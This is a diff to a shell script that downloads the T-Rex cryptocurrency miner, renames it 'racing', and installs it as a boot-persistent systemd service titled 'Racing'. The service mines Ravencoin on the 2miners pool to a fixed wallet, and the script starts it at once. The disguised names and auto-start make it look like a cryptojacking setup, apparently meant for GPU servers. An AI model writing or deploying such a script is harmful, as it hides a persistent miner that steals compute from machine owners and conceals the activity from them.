@@ -22,9 +22,9 @@ sudo systemctl enable nvidia-fabricmanager
 sudo systemctl start nvidia-fabricmanager
 sudo nvidia-smi mig -cgi 0 -C
 sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
-tar -zxvf t-rex-0.25.12-linux.tar.gz
-mv t-rex racing
+sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
+sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_no'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.$myworker -p x
+sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.$myworker -p x
